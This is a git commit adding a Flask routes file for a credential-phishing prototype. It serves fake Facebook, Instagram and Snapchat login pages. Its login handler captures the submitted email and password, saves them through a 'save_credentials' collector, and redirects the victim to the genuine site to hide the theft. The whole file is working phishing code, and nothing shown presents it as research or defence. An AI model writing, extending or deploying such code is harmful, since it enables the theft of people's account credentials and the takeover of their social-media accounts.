a443ea188dff3851a5adc842d311d6bbb5274503
vignesh0x <vikeradha06@gmail.com>
2026-07-08 13:08:56 +0530

    prototype

---
+++ web/routes.py
@@ -0,0 +1,48 @@
+from flask import Blueprint, render_template, request, redirect
+
+from core.collector import save_credentials
+
+web_bp = Blueprint(
+    'web',
+    __name__,
+    template_folder='templates',
+    static_folder='static',
+    static_url_path='/static'
+)
+
+_REDIRECT_MAP = {
+    'facebook': 'https://www.facebook.com',
+    'instagram': 'https://www.instagram.com',
+    'snapchat': 'https://www.snapchat.com',
+}
+
+
+@web_bp.route('/')
+def index():
+    return render_template('menu.html')
+
+
+@web_bp.route('/facebook')
+def facebook():
+    return render_template('facebook.html')
+
+
+@web_bp.route('/instagram')
+def instagram():
+    return render_template('instagram.html')
+
+
+@web_bp.route('/snapchat')
+def snapchat():
+    return render_template('snapchat.html')
+
+
+@web_bp.route('/login/<platform>', methods=['POST'])
+def login(platform):
+    email = request.form.get('email', '')
+    password = request.form.get('password', '')
+
+    save_credentials(platform.capitalize(), email, password)
+
+    target = _REDIRECT_MAP.get(platform, 'https://www.google.com')
+    return redirect(target)
